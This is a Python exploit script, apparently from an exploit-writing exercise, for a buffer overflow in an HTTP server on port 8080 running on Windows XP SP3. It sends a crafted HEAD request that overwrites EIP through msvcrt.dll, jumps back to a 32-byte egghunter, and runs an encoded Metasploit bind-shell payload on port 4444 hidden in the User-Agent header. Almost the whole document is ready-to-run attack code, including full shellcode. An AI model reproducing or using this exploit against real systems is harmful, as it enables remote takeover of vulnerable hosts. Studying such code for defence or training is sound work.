#!/usr/bin/python

import os
import sys
import socket

target = "192.168.1.18"
port = 8080

#--------------------------------------------------------#
# Target: Microsoft Windows XP Professional (SP3)        #
#--------------------------------------------------------#
# Bad Chars: \x00\x0d\x0a\x3d\x20\x3f                    #
#--------------------------------------------------------#
# Stage 1:                                               #
# (1) EIP: 0x77C354599 push esp # ret | msvcrt.dll       #
# (2) ESP: jump back 60 bytes in the buffer => \xEB\XC4  #
# (3) Provides enough room for egghunter; marker "b33f"  #
#--------------------------------------------------------#

# msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -e x86/alpha_mixed -t c
# [*] x86/alpha_mixed succeeded with size 744 (iteration=1)
shellcode = (
    "\xdb\xcd\xd9\x74\x24\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49"
    "\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
    "\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
    "\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"
    "\x4c\x49\x78\x6f\x79\x35\x50\x63\x30\x55\x50\x35\x30\x6d\x59"
    "\x48\x65\x66\x51\x78\x52\x32\x44\x6c\x4b\x62\x72\x64\x70\x6e"
    "\x6b\x73\x62\x34\x4c\x6e\x6b\x52\x72\x44\x54\x6c\x4b\x52\x52"
    "\x55\x78\x66\x6f\x4c\x77\x72\x6a\x46\x46\x54\x71\x49\x6f\x54"
    "\x71\x6f\x30\x6e\x4c\x65\x6c\x33\x51\x63\x4c\x64\x42\x64\x6c"
    "\x71\x30\x6f\x31\x68\x4f\x44\x4d\x55\x51\x48\x47\x6a\x42\x48"
    "\x70\x32\x72\x42\x77\x4e\x6b\x73\x62\x32\x30\x4e\x6b\x57\x32"
    "\x67\x4c\x76\x61\x58\x50\x6e\x6b\x63\x70\x53\x48\x4d\x55\x79"
    "\x50\x73\x44\x72\x6a\x56\x61\x6e\x30\x70\x50\x6e\x6b\x33\x78"
    "\x54\x58\x6c\x4b\x31\x48\x75\x70\x47\x71\x79\x43\x39\x73\x67"
    "\x4c\x67\x39\x6c\x4b\x56\x54\x6e\x6b\x47\x71\x59\x46\x34\x71"
    "\x6b\x4f\x54\x71\x6f\x30\x4c\x6c\x7a\x61\x58\x4f\x44\x4d\x77"
    "\x71\x4b\x77\x44\x78\x39\x70\x52\x55\x68\x74\x76\x63\x63\x4d"
    "\x79\x68\x55\x6b\x31\x6d\x61\x34\x51\x65\x6d\x32\x61\x48\x6c"
    "\x4b\x42\x78\x46\x44\x37\x71\x4e\x33\x70\x66\x6c\x4b\x34\x4c"
    "\x62\x6b\x4c\x4b\x71\x48\x55\x4c\x67\x71\x38\x53\x6c\x4b\x53"
    "\x34\x4e\x6b\x55\x51\x6e\x30\x6e\x69\x77\x34\x37\x54\x44\x64"
    "\x63\x6b\x43\x6b\x45\x31\x66\x39\x52\x7a\x62\x71\x39\x6f\x79"
    "\x70\x46\x38\x43\x6f\x51\x4a\x6c\x4b\x72\x32\x5a\x4b\x4c\x46"
    "\x71\x4d\x52\x48\x75\x63\x35\x62\x33\x30\x67\x70\x50\x68\x30"
    "\x77\x64\x33\x67\x42\x73\x6f\x32\x74\x42\x48\x50\x4c\x70\x77"
    "\x54\x66\x56\x67\x4b\x4f\x7a\x75\x4d\x68\x7a\x30\x55\x51\x47"
    "\x70\x57\x70\x77\x59\x5a\x64\x43\x64\x50\x50\x51\x78\x56\x49"
    "\x4f\x70\x30\x6b\x47\x70\x4b\x4f\x6a\x75\x76\x30\x76\x30\x36"
    "\x30\x62\x70\x43\x70\x42\x70\x67\x30\x62\x70\x45\x38\x7a\x4a"
    "\x64\x4f\x4b\x6f\x4b\x50\x39\x6f\x6a\x75\x6f\x79\x48\x47\x66"
    "\x51\x69\x4b\x62\x73\x53\x58\x45\x52\x53\x30\x42\x31\x31\x4c"
    "\x6e\x69\x69\x76\x71\x7a\x72\x30\x36\x36\x72\x77\x32\x48\x4f"
    "\x32\x59\x4b\x37\x47\x53\x57\x79\x6f\x4b\x65\x63\x63\x71\x47"
    "\x51\x78\x6c\x77\x5a\x49\x64\x78\x59\x6f\x39\x6f\x5a\x75\x52"
    "\x73\x36\x33\x31\x47\x32\x48\x42\x54\x6a\x4c\x37\x4b\x39\x71"
    "\x49\x6f\x5a\x75\x76\x37\x6f\x79\x38\x47\x31\x78\x61\x65\x62"
    "\x4e\x52\x6d\x43\x51\x79\x6f\x39\x45\x52\x48\x52\x43\x30\x6d"
    "\x53\x54\x73\x30\x6c\x49\x78\x63\x42\x77\x53\x67\x61\x47\x55"
    "\x61\x79\x66\x43\x5a\x37\x62\x46\x39\x70\x56\x38\x62\x49\x6d"
    "\x32\x46\x7a\x67\x51\x54\x76\x44\x57\x4c\x55\x51\x43\x31\x4e"
    "\x6d\x52\x64\x65\x74\x76\x70\x4f\x36\x47\x70\x71\x54\x63\x64"
    "\x42\x70\x36\x36\x70\x56\x76\x36\x53\x76\x71\x46\x42\x6e\x36"
    "\x36\x61\x46\x63\x63\x52\x76\x31\x78\x72\x59\x58\x4c\x55\x6f"
    "\x6c\x46\x4b\x4f\x58\x55\x6d\x59\x4d\x30\x50\x4e\x72\x76\x32"
    "\x66\x59\x6f\x34\x70\x70\x68\x64\x48\x6e\x67\x57\x6d\x65\x30"
    "\x79\x6f\x6b\x65\x6f\x4b\x5a\x50\x58\x35\x6e\x42\x33\x66\x33"
    "\x58\x4d\x76\x6d\x45\x6f\x4d\x4d\x4d\x6b\x4f\x69\x45\x75\x6c"
    "\x73\x36\x31\x6c\x45\x5a\x4d\x50\x59\x6b\x49\x70\x33\x45\x57"
    "\x75\x4d\x6b\x33\x77\x44\x53\x62\x52\x62\x4f\x43\x5a\x53\x30"
    "\x70\x53\x59\x6f\x59\x45\x41\x41")

# Our egghunter of 32 bytes, generated using our mona plugin
# !mona egg -t b33f
hunter = ( 
    "\x66\x81\xca\xff"
    "\x0f\x42\x52\x6a"
    "\x02\x58\xcd\x2e"
    "\x3c\x05\x5a\x74"
    "\xef\xb8\x62\x33" #b3
    "\x33\x66\x8b\xfa" #3f
    "\xaf\x75\xea\xaf"
    "\x75\xe7\xff\xe7")

# Our egghunter exists at the beginning of the address located at ESP
# Once our overflow occurs, EIP will be overwritten with the 0x77C35459
# address, which pushes the address of ESP - where our egghunter lives
# All we need to do is jump to it so it can execute and search for our
# payload. A short jump is made 60 bytes back to our egghunter by 0xEB 0xC4

stage_one = "A"*478 + hunter + "A"*5 + "\x59\x54\xc3\x77" + "\xeb\xc4"
stage_two = "b33fb33f" + shellcode

buffer = (
    "HEAD /" + stage_one + " HTTP/1.1\r\n"
    "HOST: 192.168.1.18:8080\r\n"
    "User-Agent: " + stage_two + "\r\n"
    "Keep-Alive: 115\r\n"
    "Connection: keep-alive\r\n\r\n")

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((target, port))

print "[*] connected to %s" % target
exploit.send(buffer)
print "[*] buffer sent to target"
print "[*] attempt to connect to listening shell on target"
exploit.close
